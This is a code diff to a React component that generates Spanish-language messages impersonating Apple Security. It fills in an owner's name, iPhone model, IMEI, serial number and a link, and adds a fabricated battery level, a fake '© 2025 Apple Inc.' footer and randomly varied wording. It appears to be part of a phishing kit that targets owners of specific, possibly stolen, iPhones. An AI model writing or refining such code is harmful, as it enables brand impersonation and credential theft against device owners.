@@ -279,7 +279,7 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
 
         if (template) {
           // Replace variables in template
-          const customMessage = template.template_content
+          const customSection = template.template_content
             .replace(/\{client_name\}/g, process.client_name || '')
             .replace(/\{phone_number\}/g, process.phone_number || '')
             .replace(/\{iphone_model\}/g, process.iphone_model || '')
@@ -290,15 +290,82 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
             .replace(/\{owner_name\}/g, process.owner_name || '')
             .replace(/\{url\}/g, process.url || '');
 
-          // Append device information
-          const deviceInfo = `\n\n📱 *Información del Dispositivo:*
-• Modelo: ${process.iphone_model || 'N/A'}
-• Almacenamiento: ${process.storage || 'N/A'}
-• Color: ${process.color || 'N/A'}
-• IMEI: ${process.imei || 'N/A'}
-• Número de Serie: ${process.serial_number || 'N/A'}`;
+          // Build complete message with random variations (like normal messages)
+          const random = (arr: string[]) => arr[Math.floor(Math.random() * arr.length)];
+          const battery = Math.floor(Math.random() * (100 - 15 + 1)) + 15;
+          
+          const openings = [
+            "🔐 Notificación de Seguridad de Apple",
+            "🛡️ Alert de Seguridad Apple",
+            "🔒 Sistema de Seguridad Apple",
+            "⚡ Notificación Automática Apple",
+            "🔔 Alerta de Dispositivo Apple"
+          ];
+          
+          const messagePhrases = [
+            "📌 Mensaje automático enviado como **aviso prioritario al número registrado**.",
+            "🚨 Notificación automática dirigida a **tu contacto principal verificado**.",
+            "📢 Alert generado automáticamente para **el teléfono asociado a tu cuenta**.",
+            "⚠️ Comunicación automática enviada a **tu número de seguridad registrado**.",
+            "📱 Mensaje del sistema enviado a **tu contacto de emergencia principal**."
+          ];
+          
+          const deviceSections = [
+            `👤 Propietario: ${process.owner_name || 'No especificado'}
+📱 Modelo: ${process.iphone_model}
+🎨 Color: ${process.color}
+💾 Almacenamiento: ${process.storage}
+📟 IMEI: ${process.imei}
+🔑 Número de serie: ${process.serial_number}
+🔋 Batería: ${battery}%`,
+            
+            `👤 Usuario: ${process.owner_name || 'No especificado'}
+📱 Dispositivo: ${process.iphone_model}
+🌈 Color: ${process.color}
+💽 Capacidad: ${process.storage}
+🔢 IMEI: ${process.imei}
+🆔 Serie: ${process.serial_number}
+⚡ Nivel batería: ${battery}%`,
+            
+            `👤 Titular: ${process.owner_name || 'No especificado'}
+📱 iPhone: ${process.iphone_model}
+🎨 Coloración: ${process.color}
+💾 Memoria: ${process.storage}
+📟 Código IMEI: ${process.imei}
+🔑 No. Serie: ${process.serial_number}
+🔋 Carga: ${battery}%`
+          ];
+          
+          const helpPhrases = [
+            "📬 ¿Eres el dueño? 👉 *Responde con* **Menú** para recibir ayuda inmediata del equipo de soporte técnico 👨🏽‍🔧",
+            "💬 ¿Necesitas asistencia? 👉 *Escribe* **Menú** para contactar con nuestro soporte especializado 👨‍💻",
+            "🆘 ¿Requieres ayuda? 👉 *Envía* **Menú** para obtener asistencia técnica inmediata 🔧",
+            "📞 ¿Buscas soporte? 👉 *Responde* **Menú** para conectar con nuestro equipo técnico 👨‍🔧",
+            "🛠️ ¿Necesitas apoyo? 👉 *Contesta* **Menú** para recibir asistencia profesional 👩‍💻"
+          ];
+          
+          const closings = [
+            "🛡️ Apple Security – Servicio activo 24/7\n©️ 2025 Apple Inc.",
+            "🔒 Apple Security – Sistema operativo 24/7\n©️ 2025 Apple Inc.",
+            "⚡ Apple Security – Monitoreo continuo\n©️ 2025 Apple Inc.",
+            "🌐 Apple Security – Protección 24 horas\n©️ 2025 Apple Inc.",
+            "🔐 Apple Security – Vigilancia permanente\n©️ 2025 Apple Inc."
+          ];
 
-          messageContent = customMessage + deviceInfo;
+          // Build complete message: opening + custom section + message phrase + device + url + help + closing
+          messageContent = `${random(openings)}
+
+${customSection}
+
+${random(messagePhrases)}
+
+${random(deviceSections)}
+
+${process.url ? `🌍 Ver estado del dispositivo: ${process.url}` : ''}
+
+${random(helpPhrases)}
+
+${random(closings)}`;
         } else {
           // Fallback to random message if template not found
           const { battery, delayedTime, formatDate, formatTime } = generateDynamicValues();
